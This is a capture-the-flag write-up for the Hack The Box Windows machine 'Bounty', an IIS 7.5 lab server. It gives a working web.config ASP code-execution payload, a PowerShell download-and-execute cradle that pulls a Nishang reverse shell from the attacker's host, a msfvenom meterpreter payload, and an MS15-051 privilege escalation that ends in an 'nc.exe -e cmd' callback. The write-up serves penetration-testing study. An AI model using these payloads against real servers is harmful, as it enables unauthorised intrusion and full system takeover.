# HTB - Bounty

## Machine Info

|Field|Details|
|---|---|
|OS|Windows (Server 2008 R2 x64)|
|Difficulty|Easy|
|IP|10.10.10.93|
|User|merlin|
|User flag|`C:\Users\merlin\Desktop\user.txt`|
|Root flag|`C:\Users\Administrator\Desktop\root.txt`|

## Tags

#htb #windows #iis #asp #web-config #file-upload #ms15-051 #token-impersonation #oscp-like

---

## Attack Path Overview

```
Nmap → port 80 (IIS 7.5)
→ Gobuster → /transfer.aspx (file upload)
→ Extension blacklist bypass → upload web.config with embedded ASP
→ RCE as merlin → Nishang reverse shell
→ systeminfo → no hotfixes applied
→ local_exploit_suggester → MS15-051
→ ms15-051x64.exe → SYSTEM
```

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate 10000 10.10.10.93
nmap -sV -sC -p 80 10.10.10.93
```

Only **1 open TCP port**: `80/tcp`

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
```

IIS 7.5 running on Windows Server 2008 R2.

### Web Enumeration

Browsing to `http://10.10.10.93` shows a static image of the wizard Merlin — no obvious functionality.

```bash
gobuster dir -u http://10.10.10.93 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x asp,aspx,txt,html
```

Discovered:

- `/transfer.aspx` — file upload form
- `/uploadedfiles/` — upload destination (403 Forbidden on directory listing)

### File Upload Filter Analysis

Uploading a `.aspx` webshell directly returns an error — the server is filtering by extension. After testing various extensions, `.config` files are **allowed**.

Key insight: On IIS 7+, `web.config` functions similarly to Apache's `.htaccess`. Uploading a `web.config` file with embedded ASP code results in **server-side code execution**.

---

## Foothold — RCE via web.config Upload

### Step 1: Verify Code Execution

Create a `web.config` proof-of-concept that evaluates `1+2`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*"
              modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified"
              requireAccess="Write" preCondition="bitness64"/>
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config"/>
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config"/>
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<%
Response.write("-"&"->")
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

Upload via `/transfer.aspx`, then visit:

```
http://10.10.10.93/uploadedfiles/web.config
```

Output shows `3` — confirming ASP code execution.

### Step 2: RCE web.config

Replace the test payload with OS command execution:

```xml
<!-- (same headers as above) -->
<!--
<%
Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("cmd.exe /c whoami")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-")
%>
-->
```

Output: `bounty\merlin`

### Step 3: Reverse Shell via Nishang

Download Nishang's `Invoke-PowerShellTcp.ps1` and append the invoke line at the bottom:

```powershell
# Add to end of Invoke-PowerShellTcp.ps1:
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.X -Port 4444
```

Start a Python web server and listener:

```bash
# Terminal 1
python3 -m http.server 80

# Terminal 2
rlwrap nc -lvnp 4444
```

Update `web.config` to download and execute the reverse shell:

```
cmd.exe /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.X/Invoke-PowerShellTcp.ps1')
```

Upload and trigger — reverse shell received as `bounty\merlin`.

---

## User Flag

```powershell
# Note: user.txt may be hidden
dir /a C:\Users\merlin\Desktop\
type C:\Users\merlin\Desktop\user.txt
```

---

## Privilege Escalation — merlin → SYSTEM (MS15-051)

### System Enumeration

```powershell
whoami /priv
systeminfo
```

Key findings from `systeminfo`:

```
OS Name:    Microsoft Windows Server 2008 R2 Datacenter
OS Version: 6.1.7600 N/A Build 7600
Hotfix(s):  0 Hotfix(s) Installed.
```

**No hotfixes applied** — highly vulnerable to kernel exploits.

### Privilege Check

```powershell
whoami /priv
```

```
SeImpersonatePrivilege        Impersonate a client after authentication   Enabled
SeAssignPrimaryTokenPrivilege Replace a process level token               Disabled
```

`SeImpersonatePrivilege` is enabled.

### Identifying Exploits — local_exploit_suggester

Upgrade to Meterpreter first, then migrate to a 64-bit process:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.X LPORT=9001 -f exe -o shell.exe
```

```bash
# Metasploit
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.X
set LPORT 9001
run -j
```

Download and execute `shell.exe` via the existing web.config RCE, then in meterpreter:

```
meterpreter > ps                    # find 64-bit process
meterpreter > migrate <pid>         # migrate to x64 process
meterpreter > run post/multi/recon/local_exploit_suggester
```

Suggested exploits include **MS15-051** (Win32k Elevation of Privilege).

### Exploiting MS15-051

Download the pre-compiled exploit:

```bash
# Transfer to target
# On attacker (Python HTTP server running):
powershell IWR http://10.10.14.X/ms15-051x64.exe -OutFile C:\temp\ms15-051x64.exe
powershell IWR http://10.10.14.X/nc.exe -OutFile C:\temp\nc.exe
```

Start a listener:

```bash
rlwrap nc -lvnp 1337
```

Execute the exploit:

```powershell
C:\temp\ms15-051x64.exe "C:\temp\nc.exe -e cmd 10.10.14.X 1337"
```

Shell received:

```
C:\temp> whoami
nt authority\system
```

---

## Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

- **File upload extension blacklist bypass** — `.config` was not blacklisted; IIS executes embedded ASP code in `web.config`, making it equivalent to uploading a webshell
- **No hotfixes = kernel exploit goldmine** — `systeminfo` showing 0 hotfixes is a strong signal to run `local_exploit_suggester`
- **SeImpersonatePrivilege** — even without kernel exploits, token impersonation attacks (JuicyPotato, PrintSpoofer) would have achieved SYSTEM
- **Meterpreter architecture matters** — `local_exploit_suggester` results differ between x86 and x64 processes; always migrate to a 64-bit process first on 64-bit targets

## Vulnerability Summary

|Vulnerability|Impact|
|---|---|
|File upload blacklist bypass (`.config`)|RCE as merlin|
|MS15-051 (Win32k EoP)|SYSTEM|
|No hotfixes applied (0 patches)|Multiple kernel exploits available|
|SeImpersonatePrivilege enabled|Token impersonation → SYSTEM|